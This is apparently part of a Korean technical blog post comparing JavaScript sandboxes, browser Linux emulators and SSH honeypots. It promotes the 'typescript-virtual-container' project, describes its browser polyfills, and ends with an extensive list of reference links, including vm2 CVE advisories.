**`node:crypto`: 순수 JS의 SHA-256**

Wasm 암호 라이브러리를 가져오는 대신 crypto 폴리필이 FIPS 180-4 라운드 상수로 SHA-256을 처음부터 구현해요. 166줄 순수 JS에 hex와 base64, Uint8Array 출력 완전 지원. 라이브러리의 모든 해시가 여기를 거쳐요. SSH 호스트 키 지문과 내부 체크섬, 전부. 간결하고 의존성 제로, 동작해요.

**`node:os`: 브라우저 진짜 하드웨어 읽기**

멋진 배려예요. 하드코딩된 가짜 값을 돌려주는 대신 `node:os`가 전체 RAM에 `navigator.deviceMemory`를 읽고 CPU 수에 `navigator.hardwareConcurrency`를 읽어요. 그래서 브라우저 빌드 `neofetch`가 실제로 자기 진짜 기기에 해당하는 것을 보고해요. `2코어, RAM 2GB` 바보 스텁이 아니에요.

```js
export function totalmem(){
  return navigator?.deviceMemory
    ? navigator.deviceMemory * 1024 * 1024 * 1024
    : 2 * 1024 * 1024 * 1024; // 기본 2GB
}
export function cpus(){
  const n = navigator?.hardwareConcurrency || 2;
  // CPU 모델 문자열을 추측하려고 navigator.userAgent도 파싱해요
  return Array.from({ length: n }, () => ({ model, speed: 2400 }));
}
```

**`node:net`, `ssh2`, `roxify`: 정직한 스텁**

브라우저는 TCP 소켓을 열거나 진짜 SSH를 실행할 수 없어서, 명확한 `NotImplemented` 오류를 던지는 스텁이에요. 뭔가 쓰려고 하면요. 실패가 명시적이어서, 객체가 있어야 할 곳에 `undefined`가 돌아오지 않아요. "브라우저에서는 안 돼요"라는 크고 명확한 메시지뿐이에요. 정확히 원하는 것이에요.

**`process.js`와 `buffer.js`: 주입되는 전역**

둘은 esbuild `inject` 옵션으로 번들의 각 파일 위에 주입돼서, 명시 import 없이 `process`와 `Buffer`를 전역으로 쓸 수 있어요. `process.js`는 아주 작아요. `env`와 `version`, `platform: 'browser'`, `queueMicrotask` 경유 `nextTick`, `performance.now()` 경유 `uptime`. `buffer.js`는 `Uint8Array` 위 `Buffer` 완전한 다시 구현이에요. SSH 구현과 VFS가 의존하는 모든 `readUInt32BE`와 `writeInt16LE` 메서드, hex와 base64 인코딩.

---

손으로 쓴 JS 폴리필 전체가 모두 약 640줄이에요. npm 패키지 없이 Wasm 없이요. 결과는 그냥 라이브러리인 브라우저 번들이고, 네이티브로 돌고, "브라우저에서 진짜 동작하나요?"라는 Node 우선 라이브러리의 평소 불안이 전혀 없어요. 궁금하면 저장소 `polyfills/` 폴더를 보는 것이 좋아요. 각 파일이 잘 담겨 있고 스스로 읽혀요. 제가 많이 좋아하는 스타일 선택이에요.

| | `vm` | `isolated-vm` | `quickjs-emscripten` | `v86` | CheerpX | WebContainers | Cowrie | `typescript-virtual-container` |
|---|---|---|---|---|---|---|---|---|
| **범주** | JS 샌드박스 | JS 샌드박스 | JS 샌드박스 | 에뮬레이터 | 에뮬레이터 | Node.js/Wasm | 허니팟 | 시뮬레이터 |
| **JS 격리** | ⚠️ 범위 | ✅ V8 Isolate | ✅ Wasm | n/a | n/a | 부분 | n/a | ✅ Worker |
| **진짜 Linux 커널** | ❌ | ❌ | ❌ | ✅ | ✅ | ❌ | ❌ | ❌ |
| **셸 인터프리터** | ❌ | ❌ | ❌ | ✅ (진짜) | ✅ (진짜) | ✅ (진짜) | 부분 | ✅ (맞춤) |
| **~170개 Unix 명령** | ❌ | ❌ | ❌ | ✅ | ✅ | 부분 | ~20 | ✅ |
| **POSIX 권한** | ❌ | ❌ | ❌ | ✅ | ✅ | ✅ | 부분 | ✅ 적용 |
| **사용자 관리** | ❌ | ❌ | ❌ | ✅ | ✅ | ❌ | 최소 | ✅ 완전 |
| **진짜 SSH 서버** | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ | ✅ |
| **SFTP와 SCP** | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ |
| **허니팟과 감사** | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ | ✅ |
| **VFS diff와 스냅샷** | ❌ | ❌ | ❌ | 제한 | ❌ | ❌ | ❌ | ✅ |
| **L2와 L3 가상 네트워크** | ❌ | ❌ | ❌ | 기본 | ❌ | ❌ | ❌ | ✅ 완전 |
| **가상 VPN** | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ |
| **브라우저 지원** | ❌ | ❌ | ✅ | ✅ | ✅ | ✅ | ❌ | ✅ |
| **네이티브 Node.js** | ✅ | ✅ | ✅ | ✅ | ❌ | ❌ | ❌ | ✅ |
| **타입 API** | 기본 | ✅ | ✅ | 최소 | ❌ | ✅ | ❌ | ✅ 완전 |
| **이진 호환** | n/a | n/a | n/a | ✅ | ✅ | 부분 | n/a | ❌ |
| **시작 시간** | 바로 | 바로 | 바로 | 15-40초 | 15-40초 | 2-5초 | 바로 | <1초 |
| **RAM과 인스턴스** | ~1 MB | ~3-10 MB | ~5-15 MB | 150-256 MB | 200+ MB | ~100 MB | ~50 MB | ~5-20 MB |
| **런타임 의존** | 0 | 1 (네이티브) | 1 (Wasm) | 0 | 독점 | 1 | Python 의존 | 3 (ssh2, ws, fflate) |
| **상태** | 안정 | ✅ 활성 | ✅ 활성 | ✅ 아주 활성 | 상용 | ✅ 활성 | ✅ 활성 | ✅ 활성 |

---

## 무엇을 쓸 때 무엇

**신뢰할 수 없는 JavaScript를 실행해야 해요. 사용자 제출 공식과 플러그인, 스크립트 훅.**
→ `isolated-vm`. 진짜 V8 Isolate, 엄격 메모리 한도, 명시 소통 다리. `vm2` 피하세요. CVE 목록이 계속 길어져요. 진심으로 몇 달마다 새 것이예요. `vm` 피하세요. 샌드박스가 전혀 아니에요, 제발.

**JS를 격리해야 하고 네이티브 확장이 싫거나 브라우저 호환이 필요해요.**
→ `quickjs-emscripten`. Wasm 경계, 약 500KB 모듈, 브라우저와 Node에서 동작. V8보다 느리지만 진짜 격리돼요.

**수정되지 않은 진짜 OS Linux를 이진 호환으로 부팅해야 해요.**
→ 32비트 Linux용 `v86`, 기존 Docker 이미지가 있으면 `container2wasm`. RAM 150MB 이상과 시작 30초를 받아들이세요. 거래예요. 64비트가 필요하면 CheerpX를 보거나 그냥 진짜 컨테이너 런타임을 쓰세요.

**백엔드 없이 웹 앱에 Linux 같은 터미널을 넣어야 해요.**
→ `v86` (완전 OS, 무겁고 시작 느림) 또는 `typescript-virtual-container` 브라우저 번들 (시뮬레이터, 가볍고 바로 시작, 완전한 데스크톱용 `startxfce4` 포함. 그거 꽤 멋져요).

**온라인 인터랙티브 코딩 튜토리얼이나 브라우저 IDE가 필요해요.**
→ Node.js 생태계 중심이면 WebContainers. 진짜 Linux 사용자 공간이 필요하면 CheerpX. 타입 API 가벼운 선택을 원하면 `typescript-virtual-container` 브라우저 번들.

**대규모 SSH 공격자 TTP를 모으고 싶어요.**
→ Cowrie가 프로덕션 표준이에요. 끝. 어떤 Linux 서버에서든 돌고 모든 SIEM과 통합되고 이제 LLM 모드도 있어요. 그냥 Cowrie를 쓰세요.

**프로그래밍 API로 Node.js 앱에 SSH 허니팟 자료가 필요해요.**
→ `typescript-virtual-container`. 명령이 실제로 실행돼요. VFS가 진짜 자료구조라 바로 잡고 비교할 수 있어요. 공격자는 설득력 있는 인터랙티브 환경을 얻고, 여러분은 Node를 떠나지 않고 구조 감사 자료를 얻어요.

**Docker 없이 CI에서 셸 자동화와 테스트가 필요해요.**
→ `typescript-virtual-container`. 1초 미만으로 시작하고, 테스트 전 스냅샷, 뒤에 복원. 타입 API로 셸 명령을 실행해요. Docker 데몬도 커널도 VM도 대기 없어요.

**멀티테넌트 셸 환경(SaaS, 교육, 훈련)이 필요해요.**
→ `typescript-virtual-container`. 인스턴스당 5~20MB 대 에뮬레이터 150~256MB. 동시 사용자 100명: ~2GB 대 ~25GB. 호스팅 비용 차이가 커요!

**현실적 허니팟이 필요하고 멀티VM 네트워크 랩도 만들고 싶어요.**
→ `typescript-virtual-container`이 이 공간에서 둘 다 하는 유일한 것이에요.

---

## 못 하는 것 (여기서는 솔직하고 싶어요)

x86 네이티브 바이너리를 실행할 수 없어요. C 코드를 컴파일하거나 진짜 Python 인터프리터를 실행하거나 Linux용으로 컴파일된 소프트웨어를 써야 하면, 이 시스템 호출을 받칠 커널 ABI가 없어요. `gcc`와 `python3`, `node` 같은 명령은 스텁이에요. `--version`과 흔한 호출에 답하지만 진짜 아무것도 실행하지 않아요.

근본 절충이에요. 메모리 10~50배 절약과 바로 시작, 브라우저 호환, 타입 API, 진짜 SSH, 가상 네트워크를 얻고 Linux 사용자 공간 이진 호환을 포기해요.

Fortune이 프로젝트를 설계하면서 이 점을 많이 생각했어요. 노리던 쓰임(허니팟, 테스트, 임베디드 터미널, CI 환경)에는 컴파일 바이너리 실행이 사실 절대 필요 없어요. 셸 파이프라인과 파일 다루기, 네트워크 라우팅, SSH가 전부를 커버해요. 하지만 쓰임에 진짜 컴파일 소프트웨어가 필요하면 `v86`이나 Docker가 정답이지 이것이 아니에요.

---

## 마무리하자면

그래서 여기까지예요. 이 생태계는 밖에서 보이는 것보다 넓고 조각나 있어요. `vm`은 범위 구분자지 샌드박스가 아니에요. `vm2`는 CVE를 계속 쌓아요 (진짜로 이달 권고를 보세요). `isolated-vm`은 JS 격리 정답이지만 JS만요. `quickjs-emscripten`은 브라우저 호환이 필요하거나 네이티브 확장을 피하고 싶을 때 정답이에요. `v86`과 CheerpX는 진짜 이진 호환이 필요할 때 진짜 에뮬레이터예요. WebContainers는 범용 Linux 환경이 아니라 Wasm 속 Node.js예요. Cowrie는 SSH 허니팟 황금 표준이지만 Python이고 네이티브 Node가 아니에요.

그리고 `typescript-virtual-container`가 있어요. Fortune 프로젝트. 조금 자기 범주에 살아요. 에뮬레이터도 JS 샌드박스도 수동 허니팟도 아니에요. 사이 어딘가 있고, 다른 어느 것도 할 수 없는 많은 것에 놀랍게 쓸모 있었어요.

`typescript-virtual-container`가 다른 어느 것도 건드리지 않는 간극을 메워요. 진짜 SSH와 SFTP, POSIX 권한, 사용자 관리, 가상 네트워크, 타입화된 TypeScript API가 있는 완전하고 프로그래밍 가능한 Linux 셸 환경. 약 10MB로 돌고 1초 미만으로 시작하고 Node.js와 브라우저에서 모두 동작해요.

써보고 싶으면요. 소스는 [github.com/itsrealfortune/typescript-virtual-container](https://github.com/itsrealfortune/typescript-virtual-container)에 있고 온라인 데모(완전한 데스크톱용 `startxfce4` 포함. 솔직히 미쳤어요)가 [itsrealfortune.fr/typescript-virtual-container/demo](https://itsrealfortune.fr/typescript-virtual-container/demo)에 있어요. 보러 가고 GitHub에 Fortune에게 별 몇 개 남겨 주세요. 받을 자격 있어요!

읽어 주셔서 감사해요. 제 기준으로도 길었어요 :) 쓸모 있었길 바라요!

---

## 출처

각 주장을 1차 출처에 연결하려고 했어요. CVE 목록, 공식 문서, GitHub 저장소, 관리자 블로그 글. 몇 가지 참고: vm2 CVE 목록이 계속 길어지니 읽을 때쯤 FortiGuard 링크가 낡았을 수 있어요 (최신은 GitHub 권고 페이지 보세요). Bellard 링크는 모두 안정적이에요. 개인 사이트가 영원히 있었고 내용이 바뀌지 않아요. 폴리필 중 하나를 파고들고 싶으면 저장소 `typescript-virtual-container`의 `polyfills/` 폴더를 직접 보면 돼요. 제가 여기에 쓸 수 있는 어떤 설명보다 읽혀요.

### JavaScript 샌드박스

- **Node.js `vm` 모듈**: 공식 문서 [nodejs.org/api/vm.html](https://nodejs.org/api/vm.html)
- **Node.js `vm` 보안 경고**: "vm 모듈은 보안 구조가 아니에요. 신뢰할 수 없는 코드를 실행하는 데 쓰지 마세요" [nodejs.org/api/vm.html#vm-executing-javascript](https://nodejs.org/api/vm.html)
- **`vm2`**: npm [npmjs.com/package/vm2](https://www.npmjs.com/package/vm2) · GitHub [github.com/patriksimek/vm2](https://github.com/patriksimek/vm2)
- **vm2 CVE 연표**: CVE 전체 목록과 날짜 FortiGuard 알림 [fortiguard.fortinet.com/outbreak-alert/vm2-sandbox-escape](https://fortiguard.fortinet.com/outbreak-alert/vm2-sandbox-escape)
- **CVE-2023-29017**: 비동기 오류 탈출, GHSA [github.com/advisories/GHSA-7jxr-cg7f-gpgv](https://github.com/advisories/GHSA-7jxr-cg7f-gpgv)
- **CVE-2023-32314**: Proxy + Error.name + Function 탈출, gist PoC [gist.github.com/arkark/e9f5cf5782dec8321095be3e52acf5ac](https://gist.github.com/arkark/e9f5cf5782dec8321095be3e52acf5ac)
- **CVE-2023-37466**: Exploit DB 항목과 완전 PoC [exploit-db.com/exploits/51898](https://www.exploit-db.com/exploits/51898)
- **2026년 vm2 CVE**: 11개 새 탈출, 분석 [thecybersecguru.com/news/vm2-sandbox-escape-vulnerability-cve-2026-26956](https://thecybersecguru.com/news/vm2-sandbox-escape-vulnerability-cve-2026-26956) · BleepingComputer [bleepingcomputer.com/news/security/critical-sandbox-escape-flaw-discovered-in-popular-vm2-nodejs-library](https://www.bleepingcomputer.com/news/security/critical-sandbox-escape-flaw-discovered-in-popular-vm2-nodejs-library/)
- **"Why Sandboxing JS in JS is Hard"**: CVE-2022-36067에 대한 oxeye.io 포스트모템 [oxeye.io/blog/vm2-sandbreak-vulnerability-cve-2022-36067](https://www.oxeye.io/blog/vm2-sandbreak-vulnerability-cve-2022-36067)
- **`isolated-vm`**: npm [npmjs.com/package/isolated-vm](https://www.npmjs.com/package/isolated-vm) · GitHub [github.com/laverdet/isolated-vm](https://github.com/laverdet/isolated-vm)
- **V8 Isolate 내부**: 임베드 가이드 [v8.dev/docs/embed](https://v8.dev/docs/embed)
- **`quickjs-emscripten`**: npm [npmjs.com/package/quickjs-emscripten](https://www.npmjs.com/package/quickjs-emscripten) · GitHub [github.com/justjake/quickjs-emscripten](https://github.com/justjake/quickjs-emscripten)
- **`@sebastianwessel/quickjs`**: npm [npmjs.com/package/@sebastianwessel/quickjs](https://www.npmjs.com/package/@sebastianwessel/quickjs) · GitHub [github.com/sebastianwessel/quickjs](https://github.com/sebastianwessel/quickjs)
- **QuickJS 엔진**: Fabrice Bellard作 [bellard.org/quickjs](https://bellard.org/quickjs/)
- **Deno 권한 모델**: 문서 [docs.deno.com/runtime/fundamentals/security](https://docs.deno.com/runtime/fundamentals/security/)
- **Deno 2 출시**: 2024년 10월 [deno.com/blog/v2](https://deno.com/blog/v2)
- **TC39 ShadowRealm 제안**: [github.com/tc39/proposal-shadowrealm](https://github.com/tc39/proposal-shadowrealm)
- **TC39 Compartments 제안**: [github.com/nicolo-ribaudo/tc39-proposal-compartments](https://github.com/nicolo-ribaudo/tc39-proposal-compartments)
- **"Sandboxing JavaScript Code"**: Deno 샌드박스 접근에 대한 Andrew Healey 실전 글 [healeycodes.com/sandboxing-javascript-code](https://healeycodes.com/sandboxing-javascript-code)

### Linux 에뮬레이터

- **`v86`**: npm [npmjs.com/package/v86](https://www.npmjs.com/package/v86) · GitHub [github.com/copy/v86](https://github.com/copy/v86) · 데모 [copy.sh/v86](https://copy.sh/v86)
- **v86 OS 지원 행렬**: [github.com/copy/v86#operating-system-support](https://github.com/copy/v86)
- **SeaBIOS** (v86이 쓰는 BIOS): [seabios.org](https://www.seabios.org/SeaBIOS)
- **Bochs VBE 확장** (VGA 참고): [bochs.sourceforge.io](https://bochs.sourceforge.io/)
- **JSLinux**: Bellard 에뮬레이터 [bellard.org/jslinux](https://bellard.org/jslinux/) · 기술 노트 (TinyEMU, 역사, asm.js에서 Wasm): [bellard.org/jslinux/tech.html](https://bellard.org/jslinux/tech.html)
- **TinyEMU**: C 소스 [bellard.org/tinyemu](https://bellard.org/tinyemu/) · 비공식 GitHub 미러 [github.com/yoshijava/TinyEMU](https://github.com/yoshijava/TinyEMU)
- **jor1k**: OpenRISC JS 에뮬레이터 [github.com/s-macke/jor1k](https://github.com/s-macke/jor1k) · 데모 [s-macke.github.io/jor1k/demos/main.html](https://s-macke.github.io/jor1k/demos/main.html)
- **CheerpX**: 문서 [cheerpx.io/docs/overview](https://cheerpx.io/docs/overview) · pthreads 가이드 [cheerpx.io/docs/guides/pthreads](https://cheerpx.io/docs/guides/pthreads)
- **WebContainers**: npm [npmjs.com/package/@webcontainer/api](https://www.npmjs.com/package/@webcontainer/api) · API 문서 [webcontainers.io](https://webcontainers.io) · 발표 [blog.stackblitz.com/posts/webcontainer-api-is-here](https://blog.stackblitz.com/posts/webcontainer-api-is-here/) · InfoQ 미리보기 [infoq.com/news/2021/07/webcontainers-nodejs](https://www.infoq.com/news/2021/07/webcontainers-nodejs/)
- **container2wasm**: GitHub [github.com/container2wasm/container2wasm](https://github.com/container2wasm/container2wasm) · NTT 블로그 글 [medium.com/nttlabs/container2wasm-2dd90a18cc9a](https://medium.com/nttlabs/container2wasm-2dd90a18cc9a) · Simon Willison 글 [simonwillison.net/2024/Jan/3/container2wasm](https://simonwillison.net/2024/Jan/3/container2wasm/)

### 터미널 스택

- **xterm.js**: npm [npmjs.com/package/@xterm/xterm](https://www.npmjs.com/package/@xterm/xterm) · GitHub [github.com/xtermjs/xterm.js](https://github.com/xtermjs/xterm.js) · 사이트 [xtermjs.org](https://xtermjs.org)
- **node-pty**: npm [npmjs.com/package/node-pty](https://www.npmjs.com/package/node-pty) · GitHub (Microsoft) [github.com/microsoft/node-pty](https://github.com/microsoft/node-pty)

### 허니팟

- **Cowrie**: GitHub [github.com/cowrie/cowrie](https://github.com/cowrie/cowrie) · 문서 [docs.cowrie.org](https://docs.cowrie.org) · 사이트 [cowrie.org](https://www.cowrie.org/)
- **Kippo**: GitHub (보관) [github.com/desaster/kippo](https://github.com/desaster/kippo)
- **endlessh**: GitHub [github.com/skeeto/endlessh](https://github.com/skeeto/endlessh)
- **sshesame**: GitHub [github.com/jaksi/sshesame](https://github.com/jaksi/sshesame)
- **Lyrebird**: Docker Hub [hub.docker.com/r/lyrebird/honeypot-base](https://hub.docker.com/r/lyrebird/honeypot-base/)
- **node-simple-ssh-honeypot**: 최소 Node.js SSH 허니팟 [github.com/Caesarovich/node-simple-ssh-honeypot](https://github.com/Caesarovich/node-simple-ssh-honeypot)
- **awesome-honeypots**: 정리 목록 [github.com/paralax/awesome-honeypots](https://github.com/paralax/awesome-honeypots)
- **MITRE ATT&CK T1082**: 시스템 정보 탐색 (공격자가 허니팟을 식별하는 방법) [attack.mitre.org/techniques/T1082](https://attack.mitre.org/techniques/T1082/)

### `typescript-virtual-container`

- **npm**: [npmjs.com/package/typescript-virtual-container](https://www.npmjs.com/package/typescript-virtual-container)
- **GitHub**: [github.com/itsrealfortune/typescript-virtual-container](https://github.com/itsrealfortune/typescript-virtual-container)
- **온라인 데모**: [itsrealfortune.fr/typescript-virtual-container/demo](https://itsrealfortune.fr/typescript-virtual-container/demo)
- **아키텍처 가이드**: [github.com/itsrealfortune/typescript-virtual-container/blob/main/guides/ARCHITECTURE.md](https://github.com/itsrealfortune/typescript-virtual-container/blob/main/guides/ARCHITECTURE.md)
- **`ssh2`** (SSH 프로토콜 구현): npm [npmjs.com/package/ssh2](https://www.npmjs.com/package/ssh2) · GitHub [github.com/mscdex/ssh2](https://github.com/mscdex/ssh2)
- **`fflate`** (VFS 스냅샷 압축): npm [npmjs.com/package/fflate](https://www.npmjs.com/package/fflate)
- **`ws`** (웹소켓 셸 전송): npm [npmjs.com/package/ws](https://www.npmjs.com/package/ws)

### 더 읽어보기

- **POSIX 권한 모델**: Open Group 명세 [pubs.opengroup.org/onlinepubs/9699919799/basedefs/V1_chap04.html](https://pubs.opengroup.org/onlinepubs/9699919799/basedefs/V1_chap04.html)
- **선행 기입 로깅** (VFS 영속에 쓰는 패턴): [en.wikipedia.org/wiki/Write-ahead_logging](https://en.wikipedia.org/wiki/Write-ahead_logging)
- **V8 Isolate 모델**: "Embedder's Guide" [v8.dev/docs/embed](https://v8.dev/docs/embed)
- **RISC-V ISA 명세** (TinyEMU와 JSLinux 맥락용): [riscv.org/technical/specifications](https://riscv.org/technical/specifications/)
- **OpenRISC 1000 아키텍처**: [opencores.org/or1k](https://opencores.org/or1k/)
- **"Running Python code in a Pyodide sandbox via Deno"**: Wasm 접근과 대비되는 Simon Willison TIL [til.simonwillison.net](https://til.simonwillison.net/deno/pyodide-sandbox)
- **"Running self-hosted QuickJS in a browser"**: quickjs-emscripten 번들 크기에 대한 Simon Willison TIL [til.simonwillison.net/npm/self-hosted-quickjs](https://til.simonwillison.net/npm/self-hosted-quickjs)
